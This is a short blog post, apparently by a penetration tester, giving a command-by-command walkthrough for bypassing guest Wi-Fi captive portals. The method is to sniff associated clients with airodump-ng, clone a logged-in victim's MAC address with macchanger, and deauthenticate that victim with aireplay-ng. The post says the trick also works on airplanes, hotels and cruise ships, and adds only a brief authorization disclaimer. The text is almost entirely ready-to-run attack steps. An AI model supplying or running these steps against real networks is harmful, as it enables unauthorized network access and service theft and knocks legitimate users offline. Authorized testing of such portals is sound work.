---
layout: post
title: Bypassing Wireless Captive Portals
categories: [pentest, wireless, bypass]
tags: [captive portal, wireless, bypass]
comments: true
---
# Bypassing Wireless Captive Portals

Ocassionally, on client projects I come across Guest Wireless Networks that require a login once connected to an AP of the Guest Network for further network/Internet access. In many cases this can be bypassed by spoofing the MAC address of a client that has already connected and authenticated to an AP.  The reason this works is that an authenticated user’s MAC is given an IP that is allowed on the network, so when spoofing a MAC address, there is no need to authenticate as the MAC address is already allowed on the network. The steps below can be used to obtain a MAC address, spoof it and reconnect to an AP bypassing the captive portal login.

**disclaimer**

In addition to client sites, this also works on airplanes, hotels and cruise ships, so please use your powers for good and only perform actions on networks in which you have authorization. 

## Requirements
1.	MAC Changer
*	sudo apt install macchanger
2.	Aircrack-ng
* sudo apt install aircrack-ng

## Bypass Steps
In the examples below I had 2 wireless interfaces: a built in wireless card (wlx8416f907e91f) and a USB wireless card (wlan0).

1.	See what MACs are associated to the AP
* sudo airodump-ng <interface> --ivs
*	sudo airodump-ng wlx8416f907e91f –ivs
 
From the above we can see A0:3D:6F8B:5D:A0 is the BSSID of an AP (MAC address) of the target Guest Wifi and 70:70:0D:72:2C:3C is a client associated and hopefully authenticated with the AP.
2.	Bring the interface down in preparation to spoof the MAC address
* sudo ifconfig <interface> down
* sudo ifconfig wlan0 down
3.	Spoof the MAC address
* sudo macchanger --mac <MAC to spoof> <interface>
* sudo macchanger --mac 70:70:0D:72:2C:3C wlan0
4.	Bring interface back up
*	sudo ifconfig <interface> up
*	sudo ifconfig wlan0 up
5.	Deauth client, hoping to move them to a different AP so there is not a conflict. **This step is optional.
*	sudo aireplay-ng -0 1 -a <BSSID> -c <client MAC> <interface>
*	sudo aireplay-ng -0 1 -a A0:3D:6F8B:5D:A0 -c 70:70:0D:72:2C:3C wlan0
6.	Connect the interface to the target SSID as normal.
7.	Release and renew your IP address now with the spoofed MAC.
*	sudo dhclient -r && sudo dhclient -v <interface>
*	sudo dhclient -r && sudo dhclient -v wlan0
8.	Profit
